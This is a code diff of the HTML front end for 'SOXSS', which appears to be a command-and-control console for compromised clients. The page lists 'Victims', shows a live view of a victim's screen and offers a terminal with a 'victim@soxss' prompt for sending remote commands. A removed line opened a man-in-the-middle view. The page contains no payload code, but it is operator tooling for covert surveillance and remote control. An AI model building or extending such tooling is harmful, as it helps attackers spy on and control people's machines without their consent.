@@ -3,7 +3,8 @@
 
 <head>
     <meta charset="UTF-8">
-    <title>Terminal Web</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SOXSS | Control Console</title>
     <link rel="stylesheet" href="console.css">
     <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
     <script src="console.js"></script>
@@ -13,39 +14,46 @@
 
 <body>
     <div class="container">
-        <!-- Menú lateral -->
+        <!-- Sidebar -->
         <aside id="sidebar">
-            <h2>Clientes Conectados</h2>
-            <input type="button" class="btnCmd" onclick="loadClientList()" value="reload">
+            <div class="sidebar-header">
+                <h2>Victims</h2>
+                <div class="reload-bar">
+                    <button class="btn-primary" onclick="loadClientList()" style="width: 100%;">SCAN NETWORK</button>
+                    <div id="autoReloadSub"><button id="autoReloadToggle" class="btn-secondary" onclick="toggleAutoReload()">AUTO-RELOAD:
+                            ON</button>
+                        <input type="number" id="reloadInterval" value="5" min="1" max="60" disabled="">
+                    </div>
+                </div>
+            </div>
             <div id="clientList">
-                <!-- Lista de clientes se generará dinámicamente -->
+                <!-- Clients populated by JS -->
             </div>
         </aside>
 
-        <!-- Sección principal con vista previa y consola -->
-        <div class="main-content">
-            <!-- Vista previa de la captura de pantalla -->
-            <div id="screenshotPreview">
-                <h2>Vista Previa</h2>
-                <img id="previewImage" src="" alt="Captura de pantalla" />
-            </div>
-
-            <!-- Panel de control (Consola) -->
-            <div class="terminal">
-                <div id="log"></div>
-                <form id="inputcomand"
-                    onsubmit="$('#log').prepend($('<pre class=inputMsg></pre>').text($('#inputText').val()));sendConsole($('#inputText').val()).then(data => logComand(data));return false">
-                    <input id="inputText" type="text" placeholder="Input your commands here">
-                </form>
-                <div id="btnGroup">
-
-                    <input type="button" class="btnCmd"
-                        onclick="window.open('http://localhost:8001/' + currentClient, '_blank');return false"
-                        value="MITM">
-
+        <!-- Main Content -->
+        <main class="main-content">
+            <!-- Preview Section -->
+            <section id="screenshotPreview" onclick="togglePreview()">
+                <div class="preview-header">
+                    <h2 id="previewStatus">Live View: No Client Selected</h2>
+                    <span id="previewInfo" style="font-size: 0.8rem; color: var(--text-muted);">Click to Toggle</span>
                 </div>
-            </div>
-        </div>
+                <img id="previewImage" src="" alt="Victim Screen" />
+            </section>
+
+            <!-- Terminal -->
+            <section class="terminal">
+                <div id="log"></div>
+
+                <div class="input-container">
+                    <form id="inputCommand" onsubmit="handleConsoleSubmit(); return false;">
+                        <span id="terminalPrompt" class="prompt">victim@soxss:~$</span>
+                        <input id="inputText" type="text" placeholder="type a command..." autocomplete="off">
+                    </form>
+                </div>
+            </section>
+        </main>
     </div>
 </body>
 
